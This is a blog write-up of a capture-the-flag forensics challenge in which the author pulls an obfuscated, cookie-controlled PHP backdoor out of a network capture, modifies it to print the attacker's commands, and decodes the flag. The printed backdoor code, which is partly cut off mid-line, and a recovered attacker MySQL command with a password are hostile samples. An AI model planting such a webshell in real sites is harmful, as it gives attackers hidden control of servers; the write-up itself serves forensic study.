---

layout: post

title: Source Zero Con Writeup - Biscuits

gh-badge:

- star

- fork

- follow

tags:

- Linux

- PHP

- Forensics

comments: true

published: true

date: '2023-06-26'

---

And we're back! Part two of the Source Zero Con 2023 writeup series. This time we're taking a look at Biscuits.

**Biscuits** - This is another challenge that involves some forensics and a bit of PHP. I didn't expect to be playing around with PHP much this CTF, but it's taught me some neat tricks and reinforced some valuable skills. Shoutout to [Rayhan0x01](https://twitter.com/Rayhan0x01) for putting this challenge together <3

### 0x1 - Analysis in Network Miner
The challenge narrative starts off like so:
```
An Attacker had compromised our WordPress site and uploaded an obfuscated PHP backdoor.

Several requests were made to that backdoor before it was self-deleted by the attacker.

We need you to investigate what the attacker was up to.

Take a look at the network log of that period: Download Here

flag format is: flag{..}

author: @Rayhan0x01
```

So, one of my favorite approaches to PCAP related challenges is to start with [Network Miner](https://www.netresec.com/?page=NetworkMiner) and go from there. Looking at the Hosts overview page, we have two hosts.
![[Pasted image 20230626210448.png]](https://blog.spookysec.net/img/Pasted image 20230626210448.png)

Pivoting over to the "Files" tab it already looks like we have some leads on a backdoor. Me3.gif.php seems awfully suspicious. Let's take a deeper look.

![[Pasted image 20230626210528.png]](https://blog.spookysec.net/img/Pasted image 20230626210528.png)

We can retrieve the POST contents by selecting the stream of interest, right clicking and then selecting "Open File". After exporting it, we should be left with some relatively interesting PHP.

### 0x2 Static and Dynamic PHP Analysis

![[Pasted image 20230626210726.png]](https://blog.spookysec.net/img/Pasted image 20230626210726.png)

Right away I see an eval and I want to change this to an echo. If you're not familiar with eval, it executes commands on the host operating system. Understanding what the attacker is sending to the web server is absolutely critical. In addition, we should place a few more echo's for clarity. I'm going to add an echo before to indicate we'll be executing a command and a \r\n after.

This should look like so:

![[Pasted image 20230626211111.png]](https://blog.spookysec.net/img/Pasted image 20230626211111.png)

The fully modified code can be found here:

```php
<?=$x=calldef();
function calldef(){$d=str_split('e5d9pintfj16a4wbu328xhgyvcrmqslko7z0_');
$x=array($_COOKIE,$d[29].$d[0].$d[29].$d[29],$d[6].$d[32].$d[6].$d[25].$d[0],$d[15].$d[12].$d[29].$d[0].$d[11].$d[>$x[7]();
echo "Executing Command: \n";
echo($x[3]($x[0][$x[1]])^$x[3]($x[0][$x[2]]));
echo "\r\n";
$rsk=$x[6]();
$x[5]();
echo($x[4]($rsk));
return;
}?>
```

Interestingly enough, the response is encoded in Base64, fortunately decoding that isn't really a bother. The other thing to note is that the attackers data is being sent and transmitted by the cookie. Let's try to replay one of the requests the attacker sent to the server. I'm going to open the requests in Wireshark to get a better idea of what's going on. We're going to take a look at the fifth TCP stream:

![[Pasted image 20230626211449.png]](https://blog.spookysec.net/img/Pasted image 20230626211449.png)

We can copy the whole Cookie header and paste it into curl:

![[Pasted image 20230626211520.png]](https://blog.spookysec.net/img/Pasted image 20230626211520.png)

and it looks like the attacker executed ``mysql -u wordpress -p 'WpPwd#3%' -e \"select version();"``. This looks like pretty standard so far. Let's keep going.

![[Pasted image 20230626211813.png]](https://blog.spookysec.net/img/Pasted image 20230626211813.png)

After decoding a few more, we can see we have recovered the rest of the flag! Pretty simple and straightforward challenge. I hope you learned a little bit more about manipulating PHP to your will :D

~ Ronnie
